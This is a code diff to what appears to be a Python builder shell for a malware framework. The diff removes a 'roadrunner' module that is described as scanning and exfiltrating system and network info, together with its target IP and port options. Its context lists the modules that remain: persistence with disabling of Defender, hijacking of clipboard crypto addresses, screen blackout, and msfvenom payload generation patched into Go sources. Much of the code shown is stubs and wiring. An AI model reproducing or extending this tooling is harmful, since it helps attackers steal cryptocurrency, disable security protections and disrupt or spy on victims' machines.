@@ -8,7 +8,6 @@ import fileinput
 import base64
 
 MODULES = {
-    'daemon/roadrunner': {'desc': 'Scans and exfiltrates system and network info'},
     'daemon/hellhound': {'desc': 'Gains persistence and disables Defender protections'},
     'daemon/gremlin': {'desc': 'Hijacks clipboard crypto addresses'},
     'daemon/blackice': {'desc': 'Blacks out the screen to disrupt user activity'},
@@ -26,10 +25,6 @@ BUILD_OPTIONS = {
 }
 
 MODULE_OPTIONS = {
-    'daemon/roadrunner': {
-        'TARGET_IP': '127.0.0.1',
-        'TARGET_PORT': '9000',
-    },
     'daemon/hellhound': {
         'PERSISTENCE': 'true',
         'DEFENDER_EXCLUDE': 'true',
@@ -202,12 +197,6 @@ def restore_flatline_go(original_lines):
     with open(go_path, 'w') as f:
         f.writelines(original_lines)
 
-def patch_roadrunner_env(target_ip, target_port):
-    return None
-
-def restore_roadrunner_go(original_lines):
-    pass
-
 def patch_hellhound_options(persistence, defender_exclude):
     return None
 
@@ -291,7 +280,6 @@ def shell():
                         go_path = modname.replace('daemon/', 'DAEMONS/') + '.go'
                         krash_original = None
                         flatline_original = None
-                        roadrunner_original = None
                         hellhound_original = None
                         gremlin_original = None
                         blackice_original = None
@@ -312,11 +300,6 @@ def shell():
                                 output_lines.append(f"Failed to generate msfvenom payload: {e}")
                                 continue
                             flatline_original = patch_flatline_base64(payload_path)
-                        elif modname == 'daemon/roadrunner':
-                            opts = MODULE_OPTIONS.get('daemon/roadrunner', {})
-                            target_ip = opts.get('TARGET_IP', '127.0.0.1')
-                            target_port = opts.get('TARGET_PORT', '9000')
-                            roadrunner_original = patch_roadrunner_env(target_ip, target_port)
                         elif modname == 'daemon/hellhound':
                             opts = MODULE_OPTIONS.get('daemon/hellhound', {})
                             persistence = opts.get('PERSISTENCE', 'true')
@@ -363,8 +346,6 @@ def shell():
                             restore_krash_go(krash_original)
                         if flatline_original:
                             restore_flatline_go(flatline_original)
-                        if roadrunner_original:
-                            restore_roadrunner_go(roadrunner_original)
                         if hellhound_original:
                             restore_hellhound_go(hellhound_original)
                         if gremlin_original:
@@ -382,7 +363,6 @@ def shell():
                         go_paths = []
                         krash_original = None
                         flatline_original = None
-                        roadrunner_original = None
                         hellhound_original = None
                         gremlin_original = None
                         blackice_original = None
@@ -404,11 +384,6 @@ def shell():
                                     output_lines.append(f"Failed to generate msfvenom payload: {e}")
                                     continue
                                 flatline_original = patch_flatline_base64(payload_path)
-                            if modname == 'daemon/roadrunner':
-                                opts = MODULE_OPTIONS.get('daemon/roadrunner', {})
-                                target_ip = opts.get('TARGET_IP', '127.0.0.1')
-                                target_port = opts.get('TARGET_PORT', '9000')
-                                roadrunner_original = patch_roadrunner_env(target_ip, target_port)
                             if modname == 'daemon/hellhound':
                                 opts = MODULE_OPTIONS.get('daemon/hellhound', {})
                                 persistence = opts.get('PERSISTENCE', 'true')
@@ -450,8 +425,6 @@ def shell():
                             restore_krash_go(krash_original)
                         if flatline_original:
                             restore_flatline_go(flatline_original)
-                        if roadrunner_original:
-                            restore_roadrunner_go(roadrunner_original)
                         if hellhound_original:
                             restore_hellhound_go(hellhound_original)
                         if gremlin_original:
